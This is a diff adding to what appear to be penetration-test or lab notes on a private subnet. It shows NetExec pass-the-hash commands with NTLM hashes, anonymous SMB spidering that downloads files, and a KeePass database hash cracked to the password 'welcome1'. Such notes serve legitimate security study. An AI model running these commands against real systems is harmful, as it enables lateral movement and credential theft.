@@ -146,7 +146,11 @@ LOCAL                                Well-known group S-1-2-0      Mandatory gro
 ./god.exe -cmd "cmd /c C:\xampp\apache\bin\ApacheMonitor.bak"
 
 ```
-
+Found hashes:
+```
+nxc smb 192.168.156.0/24 -u mark -H dcbbff66580202a5cbede9c010281ce9 -x whoami
+nxc smb 192.168.156.0/24 -u zachary -H 54abdf854d8c0653b1be3458454e4a3b -x whoami (hash authenticates to .248, but no CMD)
+```
 
 ### .189
 ```
@@ -166,3 +170,15 @@ smtp-enum-users:
 
 
 
+### .248
+Regular SMB access found, spidering:
+```
+nxc smb 192.168.156.248 -u ' ' -p ' ' -M spider_plus
+nxc smb 192.168.156.248 -u ' ' -p ' ' -M spider_plus -o DOWNLOAD_FLAG=True
+
+found Database.kdbx
+$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133
+
+ran through Hashcat:
+$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133:welcome1 
+```
